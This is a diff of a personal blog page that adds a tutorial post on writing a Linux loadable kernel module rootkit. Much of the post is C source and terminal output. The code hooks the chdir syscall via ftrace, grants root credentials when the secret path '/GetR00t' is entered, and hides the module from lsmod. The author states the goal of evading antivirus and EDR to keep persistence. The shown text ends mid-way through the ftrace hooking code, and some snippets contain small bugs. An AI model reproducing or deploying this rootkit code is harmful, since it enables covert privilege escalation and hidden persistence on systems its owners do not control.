@@ -6,7 +6,8 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Coming soon! " />
+<meta name="description" content="This research was inspired around my interest for kernels. I wanted to understand more about the internals of computers, lifting off the cover and truly understanding what is happening underneath. I was curios to understand how even the most basic of tasks were translated from high level commands were translated into operations the hardware could understand, like opening a file or running commands within the terminal.
+For more details on Linux drivers and the Kernel, please see my other post which goes into more depth Here." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://thomas-byrne.co.uk/projects/makingarootkit/" />
@@ -171,7 +172,738 @@
   
 
   <div class="post-content"><div>
-        <h1 id="coming-soon">Coming soon!<a href="#coming-soon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+        <p>This research was inspired around my interest for kernels. I wanted to understand more about the internals of computers, lifting off the cover and truly understanding what is happening underneath. I was curios to understand how even the most basic of tasks were translated from high level commands were translated into operations the hardware could understand, like opening a file or running commands within the terminal.</p>
+<p>For more details on Linux drivers and the Kernel, please see my other post which goes into more depth <a href="https://thomas-byrne.co.uk/projects/linuxdrivers/">Here</a>.</p>
+<p>Me before and during making this rootkit:
+![[Pasted image 20221203175649.png]]</p>
+<h1 id="why">Why<a href="#why" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>They are cool</li>
+<li>To learn about the Linux kernel</li>
+<li>Wanted to make a piece of software to reliably give me root without alerting AV</li>
+<li>Improve C skills</li>
+<li>Getting root is fun, but persistence can be tricky especially with current EDRs, AV, SIEMs and SOAR systems. </li>
+<li>Why not?</li>
+</ul>
+<h1 id="what">What<a href="#what" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>Essentially a Driver </li>
+<li>Complete hostile takeover of a computer</li>
+<li>A consistent and persistent way to privilege escalate</li>
+<li>Great for hiding suspicious behaviour</li>
+</ul>
+<h1 id="the-linux-kernel">The Linux Kernel<a href="#the-linux-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="what-is-a-kernel">What is a Kernel<a href="#what-is-a-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="a-kernel-is-essentially-just-a-middle-ware-between-the-os-and-the-hardware-of-the-system-this-can-be-an-entire-topic-in-itself-and-there-are-many-others-who-have-explained-this-topic-much-better-than-i-ever-could-ill-leave-some-links-here">A Kernel is essentially just a middle-ware between the OS and the hardware of the system. This can be an entire topic in itself and there are many others who have explained this topic much better than i ever could. I&rsquo;ll leave some links here:<a href="#a-kernel-is-essentially-just-a-middle-ware-between-the-os-and-the-hardware-of-the-system-this-can-be-an-entire-topic-in-itself-and-there-are-many-others-who-have-explained-this-topic-much-better-than-i-ever-could-ill-leave-some-links-here" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="what-is-a-rootkit">What is a rootkit<a href="#what-is-a-rootkit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>A rootkit is just a driver. Drivers can be user mode, or kernel mode. Essentially they are just a piece of software that allows the hardware to interact with user mode applications on the OS.</p>
+<p>There are many types of rootkits, such as Hardware , firmware, Bootloader and Memory rootkits etc but the one I focused on was a Kernel mode rootkit</p>
+<p>They are harder to detect because their actions are invisible to the user space and user space tools. Additionally, rootkits operate with the highest system privileges so they have control over any potential detection mechanisms and can implement new OS features to prevent detection</p>
+<h2 id="context">Context<a href="#context" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Linux is known to be <strong>extendable</strong>, as such, it makes it really easy to modify on the fly. This means we have the ability to extend the set of features  at runtime, which will really help later on as we can insert our drivers into the Kernel while it is still running without needing to reboot.</li>
+<li>Adding code to the kernel at runtime is called a module. In Linux to view your currently loaded modules you can use <code>lsmod</code> in the terminal. 
+<ul>
+<li>The driver I am making is also known as a <strong>Loadable Kernel Module</strong> – this is because a driver is just a piece of code loaded into the kernel.</li>
+</ul>
+</li>
+<li>These modules can do lots of things, but they typically are one of three things:
+<ol>
+<li>device drivers</li>
+<li>filesystem drivers;</li>
+<li>system calls</li>
+</ol>
+</li>
+<li>Drivers are a great validator because they are very easy to get wrong, and if they are wrong they will most likely crash your system, but if they don’t you know you’re doing well!</li>
+</ul>
+<h1 id="making-a-simple-driver">Making a simple driver<a href="#making-a-simple-driver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Linux is very simple and to make a driver there are only two requirements, the inclusion of two functions, <code>module_init</code> and <code>module_exit</code>.</p>
+<p>The init function is executed when the module is loaded and the exit function is executed when the module is unloaded. It is typically responsible for clean-up activities.</p>
+<p>Before starting to make a rootkit, we need a working driver. To eliminate as many possible reasons as to why our code wont compile or execute, let&rsquo;s keep it simple. To start we will create a barebones driver that will just print a line to the screen!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;No License&#34;</span>)
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name <span style="color:#e6db74">&#34;user&#34;</span>;
+
+module_param(name, charp, S_IRUGO);
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hello_int</span>(<span style="color:#66d9ef">void</span>)
+{
+	printk(KERN_INFO <span style="color:#e6db74">&#34;Hello %s, Welcome to the world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+	printk(KERN_INFO <span style="color:#e6db74">&#34;Goodbye, cruel world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(hello_init);
+module_exit(hello_exit);
+</code></pre></div><p>You probably noticed something weird about this c code. That is the invocation of the <code>printk()</code> method. Because this module will be executing within kernel space, user mode functions such as <code>printf()</code> won&rsquo;t work here. Instead of using <strong>libc</strong> for our functions there is a different library used within the kernel that defines some basic functions we can use.</p>
+<p>The module written above can be passed an argument from user-space and will print it back to the screen and output, like with all drivers will be stored in <code>/var/log/syslog</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ sudo insmod rootkitTest.ko name<span style="color:#f92672">=</span>Tom
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ sudo tail -1 /var/log/syslog
+Jan <span style="color:#ae81ff">20</span> 06:08:39 kali kernel: <span style="color:#f92672">[</span>185580.608407<span style="color:#f92672">]</span> Hello Tom, Welcome to the world
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ sudo rmmod rootkitTest
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ sudo tail -1 /var/log/syslog
+Jan <span style="color:#ae81ff">20</span> 06:08:54 kali kernel: <span style="color:#f92672">[</span>185595.192900<span style="color:#f92672">]</span> Goodbye, cruel world
+</code></pre></div><h1 id="extending-the-functionality-of-our-driver">Extending the functionality of our driver<a href="#extending-the-functionality-of-our-driver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="plan">Plan<a href="#plan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>The possibilities of what a rootkit can do are almost endless. To get root I could execute <code>/bin/sh</code> to provide a local high privileged shell, or I could send a reverse shell over TCP. Both of these are likely to get us caught.</p>
+<p>Instead, I decided on something a bit more stealthy. Within user space in all operating systems there are user permissions. These provide a way to implement authorisation. Typically, you will have a low privileged user and a high privileged user to handle sensitive tasks. The same is for processes, when a process is executed by a user or another process, usually it will execute within the security context of this user or process, inheriting the permissions it needs to carry out the task. Therefore, there must be a way to control the permissions of a process which we can manipulate to elevate the permissions of our terminal process to be that of root.</p>
+<p>As it turns out, there is&hellip; The way permissions work in Linux is by storing values of each process somewhere in the kernel. If I could alter these credentials then I could get assign them to be that of root.</p>
+<p>In general most rootkits hook into syscalls to alter the functionality of the OS or hook some other system functionality to inject code.</p>
+<p>For this to work, the code needs some sort of trigger, as I want to be able to control when I invoke functionality of the rootkit.</p>
+<p>To do this I could hook into a syscall and pull some data to use as my trigger. As previously mentioned, I want to stay as hidden as possible so by using some functionality that is commonly found on a Linux system is the best option. </p>
+<p>To understand how we are going to reassign our credentials we need to know some background information:</p>
+<p>In Kernels &ldquo;a process may only alter its own credentials, and may not alter those of another process.&rdquo;. Therefore, in order to get root, I need to hook a syscall that has my <code>sh</code> process as its current process.</p>
+<p>Following from this, “During the execution of a system call, such as open or read, the current process is the one that invoked the call.”. Therefore, I need to choose a syscall that is invoked by my <code>sh</code> process. </p>
+<p>Now if you’re thinking what I was thinking when I first tried this, then this sounds easy, shouldn’t every process executed via command line have its current process as the sh process?</p>
+<blockquote>
+<p><strong>spoiler</strong> the answer is No.</p>
+</blockquote>
+<p>I learnt this the hard way. However, the reason behind this is relatively understandable. In order for this to work, the syscall needs to be what’s known as a “built in” command. Built in commands are executed directly in the shell itself, unlike an external executable program which the shell would load and execute separately.</p>
+<h1 id="technicalities">Technicalities<a href="#technicalities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If we are going to use this rootkit to maintain persistence on a device, we want it to be as reliable as possible. Therefore, we need to include code to work on older Kernels. Since version <code>4.17.0</code> in <code>64-bit </code>Kernels, the way in which syscalls are handled changed. So to ensure takeover of all possible kernels I needed to include code to handle both cases.</p>
+<h2 id="deciding-on-a-syscall">Deciding on a syscall<a href="#deciding-on-a-syscall" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h1 id="chdir">chdir<a href="#chdir" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There are a plethora of syscalls we can use. Taking a look <a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">here</a> we can see all the built-in syscalls within Linux. I decided to use <code>chdir</code>. It is just a way of moving into and out of directories (exactly like <code>cd</code>).</p>
+<p>Just like a normal executable, when we execute a syscall, all of its values will end up on the stack and eventually into the registers on the CPU. We need to be able to read the values of registers to pull data from the syscall. Using the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a> it is super easy to look up which register we need to read, and what is stored in each register.</p>
+<p>However we will not read directly from the register, once the syscall is executed, registers are used to hold data to assist this execution and then the  kernel will copy them into a structure called <code>pt_regs</code>.</p>
+<p>Looking at the syscall reference from earlier, we know the path name provided as an argument when calling this syscall will be stored in the <code>rdi</code> (this will be referenced as just <code>di</code> later through this post) register.</p>
+<p>Therefore, the way I am going to trigger the driver to give me root is pulling the <code>pathname</code> from each execution of <code>chdir</code> and checking if it matches our secret directory name “<code>/GetR00t</code>”. If there&rsquo;s a match, we can invoke our method to elevate our privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+module_param(name, charp, S_IRUGO);
+
+<span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di;
+<span style="color:#66d9ef">char</span> dir[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+<span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> strncpy_from_user(dir, filename, <span style="color:#ae81ff">254</span>);
+
+<span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+{
+	printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir);
+}
+
+<span style="color:#66d9ef">if</span> ((strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>))
+{
+	printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root... </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	set_root();
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><h1 id="including-code-for-all-kernels">Including code for all Kernels<a href="#including-code-for-all-kernels" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><strong>New kernels:</strong> We define a pointer called file name and point this to the <code>di</code> member of the<code>pt_regs</code>structure. Using a function called<code> str_copy_from_user</code> I can copy this value from user space into my directory I defined in kernel space.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#ifdef PTREGS_SYSCALL_STUBS
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_chdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+	<span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+	<span style="color:#66d9ef">void</span> showrootkit(<span style="color:#66d9ef">void</span>);
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;The process is </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (pid %i) </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current<span style="color:#f92672">-&gt;</span>comm, current<span style="color:#f92672">-&gt;</span>pid);
+
+	<span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di;
+	<span style="color:#66d9ef">char</span> dir[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+	<span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> strncpy_from_user(dir, filename, <span style="color:#ae81ff">254</span>);
+	
+	<span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+	
+	{
+	
+		printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir);
+	
+	}
+}
+</code></pre></div><ul>
+<li><strong>Old kernels</strong>: Whereas in old kernels I can use the <code>str_copy_from_user</code> function accessing the filename pointer directly without any need for a structure.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fh_sys_chdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>filename)
+{
+    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+	<span style="color:#66d9ef">void</span> showrootkit(<span style="color:#66d9ef">void</span>);
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;Intercepting chdir call (old way)&#34;</span>);
+
+    <span style="color:#66d9ef">char</span> dir[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> strncpy_from_user(dir, filename, <span style="color:#ae81ff">254</span>);
+
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+		{
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir);
+		}
+		
+}
+
+</code></pre></div><h1 id="getting-root">Getting root<a href="#getting-root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+      {
+		   <span style="color:#66d9ef">void</span> hiderootkit(<span style="color:#66d9ef">void</span>);
+		   
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;set_root called&#34;</span>);
+		   
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;The process is </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (pid %i)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current<span style="color:#f92672">-&gt;</span>comm, current<span style="color:#f92672">-&gt;</span>pid);
+
+		   <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
+           root <span style="color:#f92672">=</span> prepare_creds();
+           
+           <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
+           {
+               printk(KERN_INFO <span style="color:#e6db74">&#34;root is NULL&#34;</span>);
+			   <span style="color:#66d9ef">return</span>;
+           }
+
+			printk(KERN_INFO <span style="color:#e6db74">&#34;Setting privileges... &#34;</span>);
+           <span style="color:#75715e">/* Run through and set all the various *id&#39;s of the current user and set them all to 0 (root) */</span>
+            root<span style="color:#f92672">-&gt;</span>uid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>gid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>euid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>egid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>suid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>sgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            root<span style="color:#f92672">-&gt;</span>fsuid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>fsgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+
+           <span style="color:#75715e">/* Set the credentials to root */</span>
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;Commiting creds&#34;</span>);
+           commit_creds(root);
+		   
+		   
+		   <span style="color:#75715e">/* Hide rootkit once root has been given */</span>
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;Hiding rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		   hiderootkit();
+		   hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+      }
+</code></pre></div><p>Once the secret directory is found, the <code>set_root()</code> function is called. A pointer is defined which points to the special structure called cred. This structure is how Linux stores the credentials for processes. Before we can re-assign our current processes credentials we need to fill this structure with the current values. To do this, we call <code>prepare_creds()</code> which will fill the structure with the current processes credentials.</p>
+<p>We then reference each item in this structure and reassign each value to be 0 (equal to root).</p>
+<p>The method then calls the <code>hiderootkit()</code> function. And assigns <code>hide=1</code> telling the program the module is currently hidden. More on this later&hellip;</p>
+<h1 id="hiding-the-module">Hiding the module<a href="#hiding-the-module" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The way modules are stored in the kernel is pretty messy but essentially When a user runs <code>lsmod</code>, a linked list called <code>list_head</code> is referenced which stores a list of modules currently loaded in the Kernel.</p>
+<p>Linked lists are a bit different to normal lists. Each item in the list points to the item before and after it allowing it to maintain an ordered list. For example item one points to just item 2 because there is nothing before it. Item 2 points to item 1 and item 3.</p>
+<p>Because we want to replace our module in this list to be able to remove it from the Kernel later on we need to store its position for later. By grabbing the values of the which items our module points to in this list means it can be put in back in the same place later on. Some handy functions called <code>list_add</code> and <code>list_del </code>make this really easy.</p>
+<p>I use the “<code>hide</code>” variable to determine if the module is currently hidden or visible, which allows you to switch between them if needed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev_module;
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hiderootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	prev_module <span style="color:#f92672">=</span> THIS_MODULE<span style="color:#f92672">-&gt;</span>list.prev;
+    list_del(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list);
+
+	}
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showrootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	list_add(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list, prev_module);
+	}
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
+        {
+            printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+            set_root();
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+	
+	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;/GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
+        {
+			printk(KERN_INFO <span style="color:#e6db74">&#34;showing rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+			showrootkit();
+			hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+
+	printk(KERN_INFO <span style="color:#e6db74">&#34;ORIGINAL CALL&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_chdir</span>(regs);
+</code></pre></div><h1 id="demo">Demo<a href="#demo" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ sudo insmod rootkit.ko
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ lsmod | grep -i root
+rootkit                         <span style="color:#ae81ff">20480</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ chdir /GetR00t
+
+<span style="color:#f92672">(</span>root@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ lsmod | grep -i root
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ chdir /GetR00t
+
+<span style="color:#f92672">(</span>kali@kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>$ lsmod | grep -r root
+rootkit                         <span style="color:#ae81ff">20480</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p>Our final code can be seen below. Alternatively, heres a link to the code on <a href="https://github.com/Tom-project/General/blob/master/Rootkit/rootkitHooker.c">GitHub</a></p>
+<p>In order to handle the hooking of syscalls I used some codeI found online which utilises <code>ftrace</code> (a tracing framework for Linux Kernels - very similar to <code>strace</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Hooking kernel functions using ftrace framework
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * Copyright (c) 2018 ilammy
+</span><span style="color:#75715e"> */</span>
+
+<span style="color:#75715e">#define pr_fmt(fmt) &#34;ftrace_hook: &#34; fmt
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/ftrace.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kallsyms.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/linkage.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/slab.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/version.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kprobes.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/syscalls.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/cred.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+
+MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;Example module hooking mkdir() via ftrace&#34;</span>);
+MODULE_AUTHOR(<span style="color:#e6db74">&#34;ilammy &lt;a.lozovsky@gmail.com&gt; &amp;&amp; Thomas Byrne&#34;</span>);
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+
+<span style="color:#75715e">#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5,7,0)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">lookup_name</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name)
+{
+	<span style="color:#66d9ef">struct</span> kprobe kp <span style="color:#f92672">=</span> {
+		.symbol_name <span style="color:#f92672">=</span> name
+	};
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> retval;
+
+	<span style="color:#66d9ef">if</span> (register_kprobe(<span style="color:#f92672">&amp;</span>kp) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
